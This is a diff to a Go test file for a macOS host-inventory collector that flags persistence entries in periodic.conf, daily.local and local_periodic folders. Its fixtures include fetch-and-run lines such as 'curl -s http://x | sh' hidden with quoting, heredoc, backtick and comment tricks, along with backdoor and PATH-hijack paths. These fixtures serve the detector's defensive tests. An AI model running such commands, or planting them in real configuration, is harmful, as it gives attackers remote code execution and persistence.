@@ -3,6 +3,7 @@ package hostenv
 import (
 	"context"
 	"io/fs"
+	"os"
 	"strings"
 	"testing"
 	"time"
@@ -249,48 +250,6 @@ func TestDarwinServicesAccountsAndUserOverrides(t *testing.T) {
 	}
 }
 
-// N-M8: periodic.conf is read as VAR=value: *_local, local_periodic and
-// *_enable="YES" are listed; other settings and comments are not.
-func TestParsePeriodicConf(t *testing.T) {
-	conf := "# comment\ndaily_local=\"/etc/daily.local /usr/local/bin/backdoor\"\nlocal_periodic='/usr/local/etc/periodic /opt/x/periodic'\n" +
-		"daily_clean_tmps_enable=\"YES\"\nweekly_status_security_enable=\"NO\"\ndaily_output=\"/var/log/daily.out\"\n"
-	got := ParsePeriodicConf([]byte(conf))
-	want := []string{"daily_local=/etc/daily.local /usr/local/bin/backdoor", "local_periodic=/usr/local/etc/periodic /opt/x/periodic", "daily_clean_tmps_enable=YES"}
-	if strings.Join(got, "|") != strings.Join(want, "|") {
-		t.Errorf("got %q", got)
-	}
-	// N-b: anything that is not a plain assignment is listed whole.
-	got = ParsePeriodicConf([]byte("a=1; curl -s http://x | sh\n. /opt/x/evil.sh\n/usr/local/bin/run\nb=$(id)\nc=\"plain\"\n"))
-	want = []string{"a=1; curl -s http://x | sh", ". /opt/x/evil.sh", "/usr/local/bin/run", "b=$(id)"}
-	if strings.Join(got, "|") != strings.Join(want, "|") {
-		t.Errorf("commands: got %q", got)
-	}
-}
-
-// N-b: every line of daily.local, the defaults' local_periodic folders, and
-// scripts in a local_periodic folder are listed; the stock *_enable lines of
-// /etc/defaults/periodic.conf are not.
-func TestDarwinPeriodicPersistence(t *testing.T) {
-	src := fakeMacDirs{fakeMac: fakeMac{files: map[string]string{
-		"/etc/daily.local":            "# nightly\n/usr/local/bin/sync-home\necho done\n",
-		"/etc/defaults/periodic.conf": "daily_clean_tmps_enable=\"YES\"\nlocal_periodic=\"/usr/local/etc/periodic /opt/x/periodic\"\n",
-	}}, dirs: map[string][]string{"/opt/x/periodic/daily": {"999.beacon"}}}
-	o := DarwinCollector{}.persistence(src, nil, OK([]Service(nil)), OK([]AuthorizedKeyFile(nil)))
-	got := map[string]bool{}
-	for _, it := range o.Value {
-		got[it.Location+" "+it.Command] = true
-	}
-	for _, k := range []string{"/etc/daily.local /usr/local/bin/sync-home", "/etc/daily.local echo done",
-		"/etc/defaults/periodic.conf local_periodic=/usr/local/etc/periodic /opt/x/periodic", "/opt/x/periodic/daily/999.beacon "} {
-		if !got[k] {
-			t.Errorf("missing %q in %v", k, got)
-		}
-	}
-	if got["/etc/defaults/periodic.conf daily_clean_tmps_enable=YES"] {
-		t.Error("stock *_enable listed")
-	}
-}
-
 // countMac counts how often each command runs.
 type countMac struct {
 	fakeMac
@@ -410,51 +369,6 @@ func TestDarwinOverridesUnknownNotOff(t *testing.T) {
 	}
 }
 
-// N-b2: a quote left open and a backslash at the end join lines as the shell
-// does, so a command hidden after them is listed with them; an unquoted
-// value holding a quote or backslash is not a plain assignment.
-func TestParsePeriodicConfShellLines(t *testing.T) {
-	for _, c := range []struct{ conf, want string }{
-		{"a=\"\n# \"; curl -s http://x | sh\n", "a=\"\n# \"; curl -s http://x | sh"},
-		{"a=x\\\n#; curl -s http://x | sh\n", "a=x\\\n#; curl -s http://x | sh"},
-		{"b=it\\'s\n", "b=it\\'s"},
-		{"c=say\"hi\"\n", "c=say\"hi\""},
-	} {
-		got := ParsePeriodicConf([]byte(c.conf))
-		if len(got) != 1 || got[0] != c.want {
-			t.Errorf("%q: got %q", c.conf, got)
-		}
-	}
-	if got := ParsePeriodicConf([]byte("# a comment \"\nd=\"plain\"\n")); len(got) != 0 {
-		t.Errorf("comment with a quote, then a plain line: %q", got)
-	}
-}
-
-// N-b1: every line of a .local file but blanks and comments is listed,
-// whatever its shape. S: the defaults list only local_periodic and *_local.
-func TestDarwinLocalAndDefaults(t *testing.T) {
-	local := "# header\n\nX=$(curl -s http://x | sh)\na=1; curl -s http://y | sh\nPATH=/tmp/evil:$PATH\ny=\"\n# \"; id\n"
-	defaults := "daily_clean_tmps_enable=\"YES\"\nlocal_periodic=\"/usr/local/etc/periodic\"\ndaily_local=\"/etc/daily.local\"\n. /etc/periodic.conf.local\n"
-	src := fakeMacDirs{fakeMac: fakeMac{files: map[string]string{"/etc/daily.local": local, "/etc/defaults/periodic.conf": defaults}}}
-	o := DarwinCollector{}.persistence(src, nil, OK([]Service(nil)), OK([]AuthorizedKeyFile(nil)))
-	var daily, def []string
-	for _, it := range o.Value {
-		switch it.Location {
-		case "/etc/daily.local":
-			daily = append(daily, it.Command)
-		case "/etc/defaults/periodic.conf":
-			def = append(def, it.Command)
-		}
-	}
-	want := []string{"X=$(curl -s http://x | sh)", "a=1; curl -s http://y | sh", "PATH=/tmp/evil:$PATH", "y=\"\n# \"; id"}
-	if strings.Join(daily, "|") != strings.Join(want, "|") {
-		t.Errorf("daily.local: %q", daily)
-	}
-	if strings.Join(def, "|") != "local_periodic=/usr/local/etc/periodic|daily_local=/etc/daily.local|. /etc/periodic.conf.local" {
-		t.Errorf("defaults: %q", def)
-	}
-}
-
 // S: dscl values keep their trailing spaces (part of a path).
 func TestDsclTrailingSpace(t *testing.T) {
 	if m := dsclList([]byte("carol   /Users/carol \n")); m["carol"] != "/Users/carol " {
@@ -462,58 +376,68 @@ func TestDsclTrailingSpace(t *testing.T) {
 	}
 }
 
-// A command added to /etc/defaults/periodic.conf is listed; the stock
-// function lines and commented assignments are not.
-func TestDefaultsPeriodicConfStockOnly(t *testing.T) {
-	stock := "periodic_conf_files=\"/etc/periodic.conf /etc/periodic.conf.local\"\n" +
-		"daily_clean_tmps_enable=\"YES\"\t\t# Delete stuff daily\n" +
-		"if [ -z \"${source_periodic_confs_defined}\" ]; then\n\tsource_periodic_confs_defined=yes\n\tsource_periodic_confs () {\n\t\tlocal i sourced_files\n\n" +
-		"\t\tfor i in ${periodic_conf_files}; do\n\t\t\tcase ${sourced_files} in\n\t\t\t*:$i:*)\n\t\t\t\t;;\n\t\t\t*)\n" +
-		"\t\t\t\tsourced_files=\"${sourced_files}:$i:\"\n\t\t\t\t[ -r $i ] && . $i\n\t\t\t\t;;\n\t\t\tesac\n\t\tdone\n\t}\nfi\n"
-	if got := parsePeriodicConf([]byte(stock), true); len(got) != 0 {
-		t.Errorf("stock defaults listed: %q", got)
+// Every way of hiding a command from a shell-like reader (A ${…}, B $'…',
+// C heredoc, D ;#, G backticks) is listed: no shell is simulated, every line
+// but blanks and plain comments is.
+func TestPeriodicLinesConservative(t *testing.T) {
+	for name, conf := range map[string]string{
+		"A": "x=${y:-\"}\ncurl -s http://a | sh # \"\n",
+		"B": "x=$'\\''\ncurl -s http://b | sh\n",
+		"C": "cat <<EOF >/dev/null\n# \"\nEOF\ncurl -s http://c | sh\n",
+		"D": "a=1 ;# \"\ncurl -s http://d | sh\n",
+		"G": "a=`echo \"`\ncurl -s http://g | sh #\"`\n",
+	} {
+		got := strings.Join(ParsePeriodicConf([]byte(conf)), "\n")
+		if !strings.Contains(got, "curl -s http://") {
+			t.Errorf("%s: the command is not listed: %q", name, got)
+		}
 	}
-	if got := parsePeriodicConf([]byte(stock+"curl -s http://x | sh\n"), true); len(got) != 1 || got[0] != "curl -s http://x | sh" {
-		t.Errorf("added command: %q", got)
-	}
-	if got := ParsePeriodicConf([]byte("weekly_x_enable=\"YES\"   # why\n")); len(got) != 1 || got[0] != "weekly_x_enable=YES" {
-		t.Errorf("commented assignment: %q", got)
+	got := ParsePeriodicConf([]byte("# plain comment\n\n# it's a comment with a quote\na=1 \\\n# after a backslash\n"))
+	want := []string{"# it's a comment with a quote", "a=1 \\", "# after a backslash"}
+	if strings.Join(got, "|") != strings.Join(want, "|") {
+		t.Errorf("comments: %q", got)
 	}
 }
 
-// A line goes on only after an odd backslash at its end, outside single
-// quotes and comments.
-func TestShellLinesBackslashes(t *testing.T) {
-	cases := []struct {
-		in   string
-		want int
-	}{
-		{"a=x" + `\\` + "\nb=y\n", 2},  // a=x\\ : even, ends
-		{"a=x" + `\` + "\nb=y\n", 1},   // a=x\ : goes on
-		{"a=x" + `\\\` + "\nb=y\n", 1}, // three: goes on
-		{"# x" + `\` + "\nb=y\n", 2},   // in a comment: ends
-		{"a='x" + `\` + "'\nb=y\n", 2}, // in single quotes: a plain character
+// The stock /etc/defaults/periodic.conf (Apple's crontabs, testdata) gives no
+// item, said in the detail; changed in any way (N-P2: a stock-looking line
+// added) it is listed whole. N-P3: periodic_conf_files pointed elsewhere is
+// listed. local_periodic folders are still listed.
+func TestDarwinPeriodicConfFiles(t *testing.T) {
+	stock, err := os.ReadFile("testdata/periodic/defaults-periodic.conf")
+	if err != nil {
+		t.Fatal(err)
 	}
-	for _, c := range cases {
+	run := func(files map[string]string, dirs map[string][]string) Obs[[]PersistenceItem] {
+		return DarwinCollector{}.persistence(fakeMacDirs{fakeMac: fakeMac{files: files}, dirs: dirs}, nil, OK([]Service(nil)), OK([]AuthorizedKeyFile(nil)))
+	}
+	count := func(o Obs[[]PersistenceItem], loc, sub string) int {
 		n := 0
-		for _, l := range shellLines([]byte(c.in)) {
-			if strings.TrimSpace(l) != "" {
+		for _, it := range o.Value {
+			if it.Location == loc && strings.Contains(it.Command, sub) {
 				n++
 			}
 		}
-		if n != c.want {
-			t.Errorf("%q: %d lines %q", c.in, n, shellLines([]byte(c.in)))
-		}
+		return n
 	}
-}
-
-// A '#' after an escaped space is no comment: the line is judged and listed
-// whole, so nothing after it is hidden.
-func TestPeriodicConfEscapedHash(t *testing.T) {
-	for _, l := range []string{`a=x\ #;curl -s http://x | sh`, "b=$(id) # c", "c=`id` # c"} {
-		got := ParsePeriodicConf([]byte(l + "\n"))
-		if len(got) != 1 || got[0] != l {
-			t.Errorf("%q: got %q", l, got)
-		}
+	o := run(map[string]string{"/etc/defaults/periodic.conf": string(stock)}, nil)
+	if n := count(o, "/etc/defaults/periodic.conf", ""); n != 0 || !strings.Contains(o.Detail, "/etc/defaults/periodic.conf: stock defaults") {
+		t.Errorf("stock defaults: %d items, %q", n, o.Detail)
+	}
+	o = run(map[string]string{"/etc/defaults/periodic.conf": string(stock) + "\t\t\t\ti=/path/evil.sh\n"}, nil)
+	if count(o, "/etc/defaults/periodic.conf", "i=/path/evil.sh") != 1 || count(o, "/etc/defaults/periodic.conf", "") < 10 {
+		t.Errorf("changed defaults not listed whole: %d items", count(o, "/etc/defaults/periodic.conf", ""))
+	}
+	o = run(map[string]string{"/etc/periodic.conf": "periodic_conf_files=\"/etc/periodic.conf /tmp/evil.sh\"\nlocal_periodic=\"/opt/x/periodic\"\n",
+		"/etc/daily.local": "# nightly\nPATH=/tmp/evil:$PATH\n"}, map[string][]string{"/opt/x/periodic/daily": {"999.beacon"}})
+	if count(o, "/etc/periodic.conf", "/tmp/evil.sh") != 1 || count(o, "/etc/daily.local", "PATH=/tmp/evil") != 1 {
+		t.Errorf("periodic_conf_files or daily.local not listed: %+v", o.Value)
+	}
+	found := false
+	for _, it := range o.Value {
+		found = found || it.Location == "/opt/x/periodic/daily/999.beacon"
+	}
+	if !found {
+		t.Error("local_periodic folder not listed")
 	}
 }
